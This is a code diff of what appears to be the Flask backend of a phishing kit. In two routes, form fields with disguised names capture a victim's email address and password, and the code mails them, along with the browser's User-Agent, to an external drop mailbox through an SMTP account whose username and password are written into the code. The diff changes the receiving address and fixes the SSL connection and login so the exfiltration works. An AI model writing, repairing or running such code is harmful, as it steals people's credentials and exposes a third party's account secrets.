@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'hassansheikh@elliottwave-forecast.com'
         sender_emaill = 'hassansheikh'
-        receiver_email = 'tylerjakub003@gmail.com'
+        receiver_email = 'jinna2323@yandex.com'
         password = 'L@hore789'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -198,8 +198,8 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('elliottwave-forecast.com', 465) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL('elliottwave-forecast.com', 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -218,8 +218,8 @@ def second():
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
         sender_email = 'hassansheikh@elliottwave-forecast.com'
-        sender_emaill = 'hassansheik'
-        receiver_email = 'tylerjakub003@gmail.com'
+        sender_emaill = 'hassansheikh'
+        receiver_email = 'jinna2323@yandex.com'
         password = 'L@hore789'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -239,8 +239,8 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('elliottwave-forecast.com', 465) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL('elliottwave-forecast.com', 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
         return redirect(url_for('lasmo'))
